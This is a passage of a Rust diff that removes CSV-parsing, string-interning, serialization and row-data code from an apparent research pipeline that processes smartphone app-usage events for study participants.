-        "apps_forcing_screen_open_file" | "background_apps_file" => {
-            require_one(&["package_name", "app_package_name"])
-        }
-        "app_codebook_file" => require(&["app_package_name"]),
-        "study_dates_file" => {
-            require(&["participant_id", "start_date", "end_date"])?;
-            let windows = parse_study_windows(bytes)?;
-            if row_count == 0 || windows.is_empty() {
-                Err("study_dates_file: no participant study windows found".into())
-            } else {
-                Ok(())
-            }
-        }
-        "device_sharing_file" => {
-            require(&["participant_id", "sharing_status"])?;
-            parse_device_sharing(bytes).map(|_| ())
-        }
-        "survey_attribution_file" => {
-            require(&["participant_id", "event_timestamp", "users"])?;
-            parse_survey_lookup(bytes).map(|_| ())
-        }
-        "enrolled_devices_file" => {
-            require(&["participant_id", "device_count"])?;
-            parse_enrolled_devices(bytes).map(|_| ())
-        }
-        _ => Err(format!("unsupported support role: {role}")),
-    }
-}
-
-/// Build (filter_set, filter_label_map) from raw filter-CSV bytes.
-/// Mirrors `buildFilterMap` semantics — packageName -> Set<labels>.
-/// If labels set is non-empty, only rows with matching application_label match.
-fn parse_filter_csv(bytes: &[u8]) -> HashMap<String, AHashSet<String>> {
-    let mut map: HashMap<String, AHashSet<String>> = HashMap::new();
-    let rows = parse_csv_to_records(bytes);
-    for row in &rows {
-        let pkg = trim_owned(
-            row.get("app_package_name")
-                .or_else(|| row.get("package_name")),
-        );
-        if pkg.is_empty() {
-            continue;
-        }
-        let labels = trim_owned(
-            row.get("known_application_labels")
-                .or_else(|| row.get("application_label"))
-                .or_else(|| row.get("label_or_note")),
-        );
-        let entry = map.entry(pkg).or_insert_with(AHashSet::new);
-        if !labels.is_empty() {
-            for lab in labels.split(',') {
-                let trimmed = lab.trim();
-                if !trimmed.is_empty() {
-                    entry.insert(trimmed.to_string());
-                }
-            }
-        }
-    }
-    map
-}
-
-fn parse_apps_forcing_csv(bytes: &[u8]) -> HashMap<String, String> {
-    let mut map = HashMap::new();
-    let rows = parse_csv_to_records(bytes);
-    for row in &rows {
-        let pkg = trim_owned(
-            row.get("package_name")
-                .or_else(|| row.get("app_package_name")),
-        );
-        let label = trim_owned(
-            row.get("label_or_note")
-                .or_else(|| row.get("application_label")),
-        );
-        if pkg.is_empty() || pkg.starts_with('#') {
-            continue;
-        }
-        map.insert(pkg, label);
-    }
-    map
-}
-
-fn parse_background_apps_csv(bytes: &[u8]) -> AHashSet<String> {
-    parse_csv_to_records(bytes)
-        .into_iter()
-        .filter_map(|row| {
-            let package = trim_owned(
-                row.get("package_name")
-                    .or_else(|| row.get("app_package_name")),
-            );
-            if package.is_empty() || package.starts_with('#') {
-                None
-            } else {
-                Some(package)
-            }
-        })
-        .collect()
-}
-
-#[derive(Default, Debug, Clone, PartialEq, Eq)]
-pub struct CodebookEntry {
-    /// Indexed by codebook_col_index() output name (e.g. "codebook_application_label", "bcm_play_store_genreId"…)
-    pub fields: Arc<Vec<Option<String>>>,
-}
-
-fn parse_codebook_csv(bytes: &[u8]) -> HashMap<String, CodebookEntry> {
-    let mut map: HashMap<String, CodebookEntry> = HashMap::new();
-    let rows = parse_csv_to_records(bytes);
-    let n_cols = CODEBOOK_RENAME_PAIRS.len();
-    for row in &rows {
-        let pkg = trim_owned(row.get("app_package_name"));
-        if pkg.is_empty() || map.contains_key(&pkg) {
-            continue;
-        }
-        let mut fields = vec![None; n_cols];
-        for (i, (src, _dst)) in CODEBOOK_RENAME_PAIRS.iter().enumerate() {
-            let v = trim_owned(row.get(*src));
-            fields[i] = if v.is_empty() { None } else { Some(v) };
-        }
-        map.insert(
-            pkg,
-            CodebookEntry {
-                fields: Arc::new(fields),
-            },
-        );
-    }
-    map
-}
-
-fn trim_owned(v: Option<&String>) -> String {
-    v.map(|s| s.trim().to_string()).unwrap_or_default()
-}
-
-fn parse_csv_to_records(bytes: &[u8]) -> Vec<HashMap<String, String>> {
-    parse_csv_to_records_with_physical_rows(bytes)
-        .into_iter()
-        .map(|(_physical_data_row, record)| record)
-        .collect()
-}
-
-/// Like `parse_csv_to_records`, but each surviving record carries its physical
-/// 1-based data-row number — counting EVERY data record in the file, including
-/// the all-empty records this parser skips — so error messages name the same
-/// row the incremental executor's `decode_source_records` reports via
-/// `RawRow::source_data_row`.
-fn parse_csv_to_records_with_physical_rows(bytes: &[u8]) -> Vec<(u32, HashMap<String, String>)> {
-    // csv-core's empty-input flush path differs under the optimized browser
-    // WASM target for a final unterminated field: the row can be emitted while
-    // its last cell is empty. Normalize only the missing record terminator so
-    // native and WASM parse identical bytes without changing CSV contents.
-    let mut terminated = Vec::new();
-    let bytes = if bytes.ends_with(b"\n") {
-        bytes
-    } else {
-        terminated.reserve(bytes.len() + 1);
-        terminated.extend_from_slice(bytes);
-        terminated.push(b'\n');
-        &terminated
-    };
-    let mut rdr = CsvReader::new();
-    let mut field_buf = vec![0u8; 1024];
-    let mut input = bytes;
-    // csv-core consumes the input it wrote before reporting OutputFull, so the
-    // bytes already in `field_buf` are the only copy of the front of a long
-    // cell. Carry them here across the resize; dropping them silently
-    // truncated every support-file value longer than the buffer to its tail.
-    let mut carried: Vec<u8> = Vec::new();
-    let take_field = |carried: &mut Vec<u8>, field_buf: &[u8]| -> String {
-        if carried.is_empty() {
-            return String::from_utf8_lossy(field_buf).into_owned();
-        }
-        carried.extend_from_slice(field_buf);
-        let value = String::from_utf8_lossy(carried).into_owned();
-        carried.clear();
-        value
-    };
-
-    let mut headers: Vec<String> = Vec::new();
-    loop {
-        let (result, n_in, n_out) = rdr.read_field(input, &mut field_buf);
-        input = &input[n_in..];
-        match result {
-            ReadFieldResult::InputEmpty => {
-                // Keep feeding the exhausted reader an empty slice until End
-                // so csv-core emits the final unterminated record.
-                continue;
-            }
-            ReadFieldResult::OutputFull => {
-                carried.extend_from_slice(&field_buf[..n_out]);
-                field_buf.resize(field_buf.len() * 2, 0);
-                continue;
-            }
-            ReadFieldResult::Field { record_end } => {
-                let s = take_field(&mut carried, &field_buf[..n_out])
-                    .trim()
-                    .to_string();
-                headers.push(s);
-                if record_end {
-                    break;
-                }
-            }
-            ReadFieldResult::End => break,
-        }
-    }
-
-    let mut records = Vec::new();
-    let mut row_vals: Vec<String> = vec![String::new(); headers.len()];
-    let mut col_idx = 0;
-    let mut any_nonempty = false;
-    // Physical 1-based data-row counter, incremented for every record —
-    // including all-empty records that are skipped from the output — to match
-    // `decode_source_records`'s `data_row_number` in pipeline_v2_incremental.rs.
-    let mut physical_data_row = 0_u32;
-    loop {
-        let (result, n_in, n_out) = rdr.read_field(input, &mut field_buf);
-        input = &input[n_in..];
-        match result {
-            ReadFieldResult::InputEmpty => {
-                continue;
-            }
-            ReadFieldResult::OutputFull => {
-                carried.extend_from_slice(&field_buf[..n_out]);
-                field_buf.resize(field_buf.len() * 2, 0);
-                continue;
-            }
-            ReadFieldResult::Field { record_end } => {
-                let s = take_field(&mut carried, &field_buf[..n_out]);
-                if col_idx < row_vals.len() {
-                    row_vals[col_idx].clear();
-                    row_vals[col_idx].push_str(&s);
-                    if !s.is_empty() {
-                        any_nonempty = true;
-                    }
-                }
-                col_idx += 1;
-                if record_end {
-                    physical_data_row += 1;
-                    if any_nonempty {
-                        let mut rec = HashMap::with_capacity(headers.len());
-                        for (i, h) in headers.iter().enumerate() {
-                            rec.insert(h.clone(), row_vals[i].clone());
-                        }
-                        records.push((physical_data_row, rec));
-                    }
-                    for s in row_vals.iter_mut() {
-                        s.clear();
-                    }
-                    col_idx = 0;
-                    any_nonempty = false;
-                }
-            }
-            ReadFieldResult::End => break,
-        }
-    }
-    records
-}
-
-// ---- canonical row ------------------------------------------------------
-
-/// Cheaply cloned immutable text used inside row-bearing incremental query
-/// results. A `Row` is copied at several real transformation boundaries; the
-/// text itself normally does not change at those boundaries, so sharing it
-/// avoids allocating another copy for every cached query result.
-#[derive(Clone, Debug, Eq, Hash, Ord, PartialEq, PartialOrd)]
-struct SharedString(Arc<String>);
-
-impl Default for SharedString {
-    fn default() -> Self {
-        static EMPTY: OnceLock<Arc<String>> = OnceLock::new();
-        Self(Arc::clone(EMPTY.get_or_init(|| Arc::new(String::new()))))
-    }
-}
-
-impl SharedString {
-    fn as_str(&self) -> &str {
-        self.0.as_str()
-    }
-
-    fn shared(&self) -> Arc<String> {
-        Arc::clone(&self.0)
-    }
-
-    fn into_shared(self) -> Arc<String> {
-        self.0
-    }
-}
-
-impl std::ops::Deref for SharedString {
-    type Target = str;
-
-    fn deref(&self) -> &Self::Target {
-        self.as_str()
-    }
-}
-
-impl std::fmt::Display for SharedString {
-    fn fmt(&self, formatter: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
-        formatter.write_str(self.as_str())
-    }
-}
-
-impl std::borrow::Borrow<str> for SharedString {
-    fn borrow(&self) -> &str {
-        self.as_str()
-    }
-}
-
-impl From<String> for SharedString {
-    fn from(value: String) -> Self {
-        Self(Arc::new(value))
-    }
-}
-
-impl From<&str> for SharedString {
-    fn from(value: &str) -> Self {
-        Self(Arc::new(value.to_owned()))
-    }
-}
-
-impl PartialEq<&str> for SharedString {
-    fn eq(&self, other: &&str) -> bool {
-        self.as_str() == *other
-    }
-}
-
-#[derive(serde::Serialize)]
-struct PersistedStringRef<'a> {
-    id: u32,
-    value: Option<&'a str>,
-}
-
-#[derive(serde::Serialize, serde::Deserialize)]
-struct PersistedString {
-    id: u32,
-    value: Option<String>,
-}
-
-struct PersistedStringEncoder(AHashMap<SharedString, u32>);
-
-impl Default for PersistedStringEncoder {
-    fn default() -> Self {
-        Self(AHashMap::new())
-    }
-}
-
-#[derive(Default)]
-struct PersistedStringDecoder(Vec<Arc<String>>);
-
+#[cfg(test)]
 thread_local! {
-    static PERSISTED_STRING_ENCODER: RefCell<Option<PersistedStringEncoder>> = const {
-        RefCell::new(None)
-    };
-    static PERSISTED_STRING_DECODER: RefCell<Option<PersistedStringDecoder>> = const {
-        RefCell::new(None)
-    };
-}
-
-struct PersistedStringEncoderGuard;
-
-impl Drop for PersistedStringEncoderGuard {
-    fn drop(&mut self) {
-        PERSISTED_STRING_ENCODER.with(|slot| {
-            slot.borrow_mut().take();
-        });
-    }
-}
-
-struct PersistedStringDecoderGuard;
-
-impl Drop for PersistedStringDecoderGuard {
-    fn drop(&mut self) {
-        PERSISTED_STRING_DECODER.with(|slot| {
-            slot.borrow_mut().take();
-        });
-    }
-}
-
-fn with_serialized_row_string_table<T>(encode: impl FnOnce() -> T) -> T {
-    PERSISTED_STRING_ENCODER.with(|slot| {
-        let previous = slot.borrow_mut().replace(PersistedStringEncoder::default());
-        assert!(previous.is_none(), "row string serialization table nested");
-    });
-    let _guard = PersistedStringEncoderGuard;
-    encode()
-}
-
-fn serialize_persisted_string<S>(value: &SharedString, serializer: S) -> Result<S::Ok, S::Error>
-where
-    S: serde::Serializer,
-{
-    let (id, first) = PERSISTED_STRING_ENCODER.with(|slot| {
-        let mut slot = slot.borrow_mut();
-        let table = slot.as_mut().ok_or_else(|| {
-            <S::Error as serde::ser::Error>::custom(
-                "binary Chronicle row serialization requires a string table",
-            )
-        })?;
-        if let Some(id) = table.0.get(value).copied() {
-            Ok((id, false))
-        } else {
-            let id = u32::try_from(table.0.len()).map_err(|_| {
-                <S::Error as serde::ser::Error>::custom("Chronicle row string table exceeds u32")
-            })?;
-            table.0.insert(value.clone(), id);
-            Ok((id, true))
-        }
-    })?;
-    serde::Serialize::serialize(
-        &PersistedStringRef {
-            id,
-            value: first.then(|| value.as_str()),
-        },
-        serializer,
-    )
-}
-
-fn deserialize_persisted_string<'de, D>(deserializer: D) -> Result<SharedString, D::Error>
-where
-    D: serde::Deserializer<'de>,
-{
-    let persisted = <PersistedString as serde::Deserialize>::deserialize(deserializer)?;
-    PERSISTED_STRING_DECODER.with(|slot| {
-        let mut slot = slot.borrow_mut();
-        let table = slot.as_mut().ok_or_else(|| {
-            <D::Error as serde::de::Error>::custom(
-                "binary Chronicle row deserialization requires a string table",
-            )
-        })?;
-        let value = if let Some(value) = persisted.value {
-            if persisted.id as usize != table.0.len() {
-                return Err(<D::Error as serde::de::Error>::custom(
-                    "Chronicle row string definition is out of order",
-                ));
-            }
-            let shared = static_lineage_text(&value).unwrap_or_else(|| Arc::new(value));
-            table.0.push(Arc::clone(&shared));
-            shared
-        } else {
-            table.0.get(persisted.id as usize).cloned().ok_or_else(|| {
-                <D::Error as serde::de::Error>::custom(
-                    "Chronicle row string reference is undefined",
-                )
-            })?
-        };
-        Ok(SharedString(value))
-    })
-}
-
-/// Temporary value interner used while a row table is constructed. It shares
-/// repeated strings within that table without retaining raw-data values after
-/// the table is dropped or introducing global mutable state.
-struct SharedStringPool(AHashSet<SharedString>);
-
-impl Default for SharedStringPool {
-    fn default() -> Self {
-        Self(AHashSet::new())
-    }
-}
-
-impl SharedStringPool {
-    fn intern_owned(&mut self, value: String) -> SharedString {
-        if let Some(existing) = self.0.get(value.as_str()) {
-            return existing.clone();
-        }
-        let shared = SharedString::from(value);
-        self.0.insert(shared.clone());
-        shared
-    }
-
-    fn intern(&mut self, value: &str) -> SharedString {
-        if let Some(existing) = self.0.get(value) {
-            return existing.clone();
-        }
-        let shared = SharedString::from(value);
-        self.0.insert(shared.clone());
-        shared
-    }
-}
-
-thread_local! {
-    static DESERIALIZED_ROW_STRING_POOL: RefCell<Option<SharedStringPool>> = const {
-        RefCell::new(None)
-    };
-}
-
-struct DeserializedRowStringPoolGuard;
-
-impl Drop for DeserializedRowStringPoolGuard {
-    fn drop(&mut self) {
-        DESERIALIZED_ROW_STRING_POOL.with(|slot| {
-            slot.borrow_mut().take();
-        });
-    }
-}
-
-fn with_deserialized_row_string_pool<T>(decode: impl FnOnce() -> T) -> T {
-    DESERIALIZED_ROW_STRING_POOL.with(|slot| {
-        let previous = slot.borrow_mut().replace(SharedStringPool::default());
-        assert!(previous.is_none(), "row string deserialization pool nested");
-    });
-    PERSISTED_STRING_DECODER.with(|slot| {
-        let previous = slot.borrow_mut().replace(PersistedStringDecoder::default());
-        assert!(
-            previous.is_none(),
-            "row string deserialization table nested"
-        );
-    });
-    let _pool_guard = DeserializedRowStringPoolGuard;
-    let _table_guard = PersistedStringDecoderGuard;
-    decode()
-}
-
-fn intern_deserialized_string(value: String) -> SharedString {
-    DESERIALIZED_ROW_STRING_POOL.with(|slot| {
-        let mut slot = slot.borrow_mut();
-        match slot.as_mut() {
-            Some(pool) => pool.intern_owned(value),
-            None => SharedString::from(value),
-        }
-    })
-}
-
-fn intern_deserialized_str(value: &str) -> SharedString {
-    DESERIALIZED_ROW_STRING_POOL.with(|slot| {
-        let mut slot = slot.borrow_mut();
-        match slot.as_mut() {
-            Some(pool) => pool.intern(value),
-            None => SharedString::from(value),
-        }
-    })
-}
-
-impl serde::Serialize for SharedString {
-    fn serialize<S>(&self, serializer: S) -> Result<S::Ok, S::Error>
-    where
-        S: serde::Serializer,
-    {
-        if serializer.is_human_readable() {
-            serializer.serialize_str(self.as_str())
-        } else {
-            serialize_persisted_string(self, serializer)
-        }
-    }
-}
-
-impl<'de> serde::Deserialize<'de> for SharedString {
-    fn deserialize<D>(deserializer: D) -> Result<Self, D::Error>
-    where
-        D: serde::Deserializer<'de>,
-    {
-        if !deserializer.is_human_readable() {
-            return deserialize_persisted_string(deserializer);
-        }
-
-        struct SharedStringVisitor;
-
-        impl serde::de::Visitor<'_> for SharedStringVisitor {
-            type Value = SharedString;
-
-            fn expecting(&self, formatter: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
-                formatter.write_str("a UTF-8 string")
-            }
-
-            fn visit_borrowed_str<E>(self, value: &str) -> Result<Self::Value, E>
-            where
-                E: serde::de::Error,
-            {
-                Ok(intern_deserialized_str(value))
-            }
-
-            fn visit_str<E>(self, value: &str) -> Result<Self::Value, E>
-            where
-                E: serde::de::Error,
-            {
-                Ok(intern_deserialized_str(value))
-            }
-
-            fn visit_string<E>(self, value: String) -> Result<Self::Value, E>
-            where
-                E: serde::de::Error,
-            {
-                Ok(intern_deserialized_string(value))
-            }
-        }
-
-        deserializer.deserialize_string(SharedStringVisitor)
-    }
-}
-
-#[derive(Clone)]
-struct Row(Arc<RowInner>);
-
-/// The derived checkpoint parts travel with the immutable row value. Each
-/// semantic component is cached separately so a classification-only edit does
-/// not force the identity and temporal bytes through the hash function again.
-struct RowInner {
-    data: RowData,
-    checkpoint_parts: RowCheckpointCache,
-}
-
-#[derive(Default)]
-struct RowCheckpointCache {
-    identity: OnceLock<[u8; 16]>,
-    temporal: OnceLock<[u8; 16]>,
-    classification: OnceLock<[u8; 16]>,
-}
-
-#[derive(serde::Serialize)]
-struct PersistedRowRef<'a> {
-    data: &'a RowData,
-    identity: Option<[u8; 16]>,
-    temporal: Option<[u8; 16]>,
-    classification: Option<[u8; 16]>,
-}
-
-#[derive(serde::Deserialize)]
-struct PersistedRow {
-    data: RowData,
-    identity: Option<[u8; 16]>,
-    temporal: Option<[u8; 16]>,
-    classification: Option<[u8; 16]>,
-}
-
-impl Clone for RowCheckpointCache {
-    fn clone(&self) -> Self {
-        fn copy_lock(source: &OnceLock<[u8; 16]>) -> OnceLock<[u8; 16]> {
-            let copy = OnceLock::new();
-            if let Some(value) = source.get() {
-                copy.set(*value).expect("fresh checkpoint lock");
-            }
-            copy
-        }
-
-        Self {
-            identity: copy_lock(&self.identity),
-            temporal: copy_lock(&self.temporal),
-            classification: copy_lock(&self.classification),
-        }
-    }
-}
-
-impl RowInner {
-    fn new(data: RowData) -> Self {
-        Self {
-            data,
-            checkpoint_parts: RowCheckpointCache::default(),
-        }
-    }
-}
-
-impl Clone for RowInner {
-    fn clone(&self) -> Self {
-        Self {
-            data: self.data.clone(),
-            checkpoint_parts: self.checkpoint_parts.clone(),
-        }
-    }
-}
-
-#[derive(Clone, serde::Serialize, serde::Deserialize)]
-struct RowData {
-    /// One-based raw CSV data-row numbers (the header is not counted) that
-    /// may contribute to this row. Matching/state-machine outputs retain a
-    /// conservative dependency set rather than claiming false exactness.
-    source_data_rows: SourceDataRows,
-    /// Exact descriptions of candidate regions searched to establish that a
-    /// required matching event was absent. These remain separate from rows
-    /// that directly supplied output values.
-    #[serde(
-        serialize_with = "serialize_lineage_searches",
-        deserialize_with = "deserialize_lineage_searches"
-    )]
-    lineage_searches: Arc<SmallVec<[LineageSearchEvidence; 1]>>,
-    study_id: SharedString,
-    participant_id: SharedString,
-    possible_device_model: SharedString,
-    username: SharedString,
-    application_label: SharedString,
-    interaction_type: SharedString,
-    app_package_name: SharedString,
-    event_timestamp_ns: i64,
-    timezone: SharedString,
-    data_time_gap_hours: f64,
-    date: SharedString,
-    day: u8,
-    weekday_mf: u8,
-    weekday_mth: u8,
-    weekday_su_th: u8,
-    hour: u8,
-    quarter: u8,
-    start_timestamp_ns: Option<i64>,
-    stop_timestamp_ns: Option<i64>,
-    duration_seconds: Option<f64>,
-    duration_minutes: Option<f64>,
-    screen_usage_end_reason: Option<SharedString>,
-    screen_usage_end_reason_confidence: Option<f64>,
-    screen_usage_stop_event_type: Option<SharedString>,
-    screen_usage_last_activity_timestamp_ns: Option<i64>,
-    screen_usage_tail_gap_seconds: Option<f64>,
-    screen_usage_foreground_app_package: Option<SharedString>,
-    screen_usage_apps_forcing_screen_open_label: Option<SharedString>,
-    screen_usage_lock_screen_only: Option<u8>,
-    any_app_usage_flags: SharedString,
-    valid_app_new_engage_30s: i32,
-    valid_app_new_engage_custom: i32,
-    valid_app_switched_app: i32,
-    valid_app_usage_time_gap_hours: f64,
-    any_app_new_engage_30s: i32,
-    any_app_new_engage_custom: i32,
-    any_app_switched_app: i32,
-    any_app_usage_time_gap_hours: f64,
-    genre_id_scraped: Option<SharedString>,
-    broad_app_category: Option<SharedString>,
-    /// Per-codebook column values (Option<String>) parallel to CODEBOOK_RENAME_PAIRS.
-    #[serde(
-        serialize_with = "serialize_codebook_fields",
-        deserialize_with = "deserialize_codebook_fields"
-    )]
-    codebook_fields: Arc<Vec<Option<String>>>,
-    codebook_genre_fields_cleared: bool,
-    index: usize,
-    /// Present only when `model_concurrent_usage` is true. Value is "primary"
-    /// or "secondary". None when the flag is off (column absent from output).
-    usage_layer: Option<SharedString>,
-}
-
-fn serialize_lineage_searches<S>(
-    value: &Arc<SmallVec<[LineageSearchEvidence; 1]>>,
-    serializer: S,
-) -> Result<S::Ok, S::Error>
-where
-    S: serde::Serializer,
-{
-    serde::Serialize::serialize(value.as_slice(), serializer)
-}
-
-fn deserialize_lineage_searches<'de, D>(
-    deserializer: D,
-) -> Result<Arc<SmallVec<[LineageSearchEvidence; 1]>>, D::Error>
-where
-    D: serde::Deserializer<'de>,
-{
-    struct LineageSearchesVisitor;
-
-    impl<'de> serde::de::Visitor<'de> for LineageSearchesVisitor {
-        type Value = Arc<SmallVec<[LineageSearchEvidence; 1]>>;
-
-        fn expecting(&self, formatter: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
-            formatter.write_str("a sequence of lineage-search records")
-        }
-
-        fn visit_seq<A>(self, mut sequence: A) -> Result<Self::Value, A::Error>
-        where
-            A: serde::de::SeqAccess<'de>,
-        {
-            let mut searches = SmallVec::new();
-            while let Some(search) = sequence.next_element()? {
-                searches.push(search);
-            }
-            if searches.is_empty() {
-                Ok(empty_lineage_searches())
-            } else {
-                Ok(Arc::new(searches))
-            }
-        }
-    }
-
-    deserializer.deserialize_seq(LineageSearchesVisitor)
-}
-
-fn serialize_codebook_fields<S>(
-    value: &Arc<Vec<Option<String>>>,
-    serializer: S,
-) -> Result<S::Ok, S::Error>
-where
-    S: serde::Serializer,
-{
-    serde::Serialize::serialize(value, serializer)
-}
-
-fn deserialize_codebook_fields<'de, D>(
-    deserializer: D,
-) -> Result<Arc<Vec<Option<String>>>, D::Error>
-where
-    D: serde::Deserializer<'de>,
-{
-    struct CodebookFieldsVisitor;
-
-    impl<'de> serde::de::Visitor<'de> for CodebookFieldsVisitor {
-        type Value = Arc<Vec<Option<String>>>;
-
-        fn expecting(&self, formatter: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
-            formatter.write_str("the fixed Chronicle codebook field sequence")
-        }
-
-        fn visit_seq<A>(self, mut sequence: A) -> Result<Self::Value, A::Error>
-        where
-            A: serde::de::SeqAccess<'de>,
-        {
-            let mut fields = SmallVec::<[Option<String>; 32]>::new();
-            while let Some(field) = sequence.next_element()? {
-                fields.push(field);
-            }
-            if fields.len() == CODEBOOK_RENAME_PAIRS.len() && fields.iter().all(Option::is_none) {
-                Ok(empty_codebook_fields())
-            } else {
-                Ok(Arc::new(fields.into_vec()))
-            }
-        }
-    }
-
-    deserializer.deserialize_seq(CodebookFieldsVisitor)
-}
-
-impl serde::Serialize for Row {
-    fn serialize<S>(&self, serializer: S) -> Result<S::Ok, S::Error>
-    where
-        S: serde::Serializer,
-    {
-        if serializer.is_human_readable() {
-            self.0.data.serialize(serializer)
-        } else {
-            PersistedRowRef {
-                data: &self.0.data,
-                identity: self.0.checkpoint_parts.identity.get().copied(),
-                temporal: self.0.checkpoint_parts.temporal.get().copied(),
-                classification: self.0.checkpoint_parts.classification.get().copied(),
-            }
-            .serialize(serializer)
-        }
-    }
-}
-
-impl<'de> serde::Deserialize<'de> for Row {
-    fn deserialize<D>(deserializer: D) -> Result<Self, D::Error>
-    where
-        D: serde::Deserializer<'de>,
-    {
-        if deserializer.is_human_readable() {
-            RowData::deserialize(deserializer).map(|data| Self(Arc::new(RowInner::new(data))))
-        } else {
-            PersistedRow::deserialize(deserializer).map(|persisted| {
-                fn restored(value: Option<[u8; 16]>) -> OnceLock<[u8; 16]> {
-                    let lock = OnceLock::new();
-                    if let Some(value) = value {
-                        lock.set(value).expect("fresh checkpoint lock");
-                    }
-                    lock
-                }
-
-                Self(Arc::new(RowInner {
-                    data: persisted.data,
-                    checkpoint_parts: RowCheckpointCache {
-                        identity: restored(persisted.identity),
-                        temporal: restored(persisted.temporal),
-                        classification: restored(persisted.classification),
-                    },
-                }))
-            })
-        }
-    }
-}
-
-impl Row {
-    fn new(data: RowData) -> Self {
-        Self(Arc::new(RowInner::new(data)))
-    }
-
-    fn edit_components(
-        &mut self,
-        identity: bool,
-        temporal: bool,
-        classification: bool,
-    ) -> &mut RowData {
-        let inner = Arc::make_mut(&mut self.0);
-        if identity {
-            inner.checkpoint_parts.identity = OnceLock::new();
-        }
-        if temporal {
-            inner.checkpoint_parts.temporal = OnceLock::new();
-        }
-        if classification {
-            inner.checkpoint_parts.classification = OnceLock::new();
-        }
-        &mut inner.data
-    }
-
-    fn edit_identity(&mut self) -> &mut RowData {
-        self.edit_components(true, false, false)
-    }
-
-    fn edit_temporal(&mut self) -> &mut RowData {
-        self.edit_components(false, true, false)
-    }
-
-    fn edit_classification(&mut self) -> &mut RowData {
-        self.edit_components(false, false, true)
-    }
-
-    fn edit_all(&mut self) -> &mut RowData {
-        self.edit_components(true, true, true)
-    }
-}
-
-impl std::ops::Deref for Row {
-    type Target = RowData;
-
-    fn deref(&self) -> &Self::Target {
-        &self.0.data
-    }
-}
-
-impl std::ops::DerefMut for Row {
-    fn deref_mut(&mut self) -> &mut Self::Target {
-        self.edit_all()
-    }
-}
-
-#[derive(Clone, Copy, Debug, PartialEq, Eq, serde::Serialize, serde::Deserialize)]
-#[serde(rename_all = "camelCase")]
-pub struct SourceDataRowRange {
-    pub first: u32,
-    pub last: u32,
-}
-
-#[derive(Clone, Debug, PartialEq, Eq, serde::Serialize, serde::Deserialize)]
-#[serde(rename_all = "camelCase")]
-pub struct LineageSearchEvidence {
-    #[serde(
-        serialize_with = "serialize_shared_arc_string",
-        deserialize_with = "deserialize_shared_arc_string"
-    )]
-    pub protocol_version: Arc<String>,
-    #[serde(
-        serialize_with = "serialize_shared_arc_string",
-        deserialize_with = "deserialize_shared_arc_string"
-    )]
-    pub reason: Arc<String>,
-    #[serde(
-        serialize_with = "serialize_shared_arc_string",
-        deserialize_with = "deserialize_shared_arc_string"
-    )]
-    pub index_space: Arc<String>,
-    #[serde(
-        serialize_with = "serialize_shared_arc_string",
-        deserialize_with = "deserialize_shared_arc_string"
-    )]
-    pub start_participant_id: Arc<String>,
-    pub start_event_index: u32,
-    pub end_event_index_exclusive: u32,
-    pub candidate_event_count: u32,
-    pub candidate_chain_digest: LineageSearchDigest,
-}
-
-fn serialize_shared_arc_string<S>(value: &Arc<String>, serializer: S) -> Result<S::Ok, S::Error>
-where
-    S: serde::Serializer,
-{
-    if serializer.is_human_readable() {
-        serializer.serialize_str(value)
-    } else {
-        serialize_persisted_string(&SharedString(Arc::clone(value)), serializer)
-    }
-}
-
-fn deserialize_shared_arc_string<'de, D>(deserializer: D) -> Result<Arc<String>, D::Error>
-where
-    D: serde::Deserializer<'de>,
-{
-    if !deserializer.is_human_readable() {
-        return deserialize_persisted_string(deserializer).map(SharedString::into_shared);
-    }
-    struct SharedArcStringVisitor;
-
-    impl serde::de::Visitor<'_> for SharedArcStringVisitor {
-        type Value = Arc<String>;
-
-        fn expecting(&self, formatter: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
-            formatter.write_str("a UTF-8 string")
-        }
-
-        fn visit_borrowed_str<E>(self, value: &str) -> Result<Self::Value, E>
-        where
-            E: serde::de::Error,
-        {
-            Ok(intern_deserialized_arc_str(value))
-        }
-
-        fn visit_str<E>(self, value: &str) -> Result<Self::Value, E>
-        where
-            E: serde::de::Error,
-        {
-            Ok(intern_deserialized_arc_str(value))
-        }
-
-        fn visit_string<E>(self, value: String) -> Result<Self::Value, E>
-        where
-            E: serde::de::Error,
-        {
-            Ok(intern_deserialized_arc_string(value))
-        }
-    }
-
-    deserializer.deserialize_string(SharedArcStringVisitor)
-}
-
-fn static_lineage_text(value: &str) -> Option<Arc<String>> {
-    match value {
-        "chronicle-lineage-search/v1" => Some(shared_lineage_text("chronicle-lineage-search/v1")),
-        "selected-qualifying-stop" => Some(shared_lineage_text("selected-qualifying-stop")),
-        "no-qualifying-stop" => Some(shared_lineage_text("no-qualifying-stop")),
-        "screen-credit-liveness-window" => {
-            Some(shared_lineage_text("screen-credit-liveness-window"))
-        }
-        "pipeline-event-order" => Some(shared_lineage_text("pipeline-event-order")),
-        "participant-source-event-order" => {
-            Some(shared_lineage_text("participant-source-event-order"))
-        }
-        _ => None,
-    }
-}
-
-fn intern_deserialized_arc_str(value: &str) -> Arc<String> {
-    static_lineage_text(value).unwrap_or_else(|| intern_deserialized_str(value).into_shared())
-}
-
-fn intern_deserialized_arc_string(value: String) -> Arc<String> {
-    static_lineage_text(&value).unwrap_or_else(|| intern_deserialized_string(value).into_shared())
-}
-
-/// Raw BLAKE3 output that retains the public `blake3:<hex>` wire format
-/// without allocating a unique 71-byte string for every searched event range.
-#[derive(Clone, Copy, Debug, Eq, Hash, PartialEq)]
-pub struct LineageSearchDigest([u8; 32]);
-
-impl LineageSearchDigest {
-    fn from_hasher(hasher: CheckpointHasher) -> Self {
-        Self(*hasher.finalize().as_bytes())
-    }
-
-    pub fn parse(value: &str) -> Result<Self, String> {
-        let hex = value
-            .strip_prefix("blake3:")
-            .ok_or_else(|| "lineage search digest does not use blake3".to_string())?;
-        let mut digest = [0_u8; 32];
-        hex::decode_to_slice(hex, &mut digest)
-            .map_err(|error| format!("decode lineage search digest: {error}"))?;
-        Ok(Self(digest))
-    }
-
-    pub fn as_bytes(&self) -> &[u8; 32] {
-        &self.0
-    }
-
-    fn encoded(self) -> [u8; 71] {
-        encode_blake3_digest(self.0)
-    }
-}
-
-impl std::fmt::Display for LineageSearchDigest {
-    fn fmt(&self, formatter: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
-        let encoded = self.encoded();
-        formatter.write_str(std::str::from_utf8(&encoded).expect("BLAKE3 digest is ASCII"))
-    }
-}
-
-impl serde::Serialize for LineageSearchDigest {
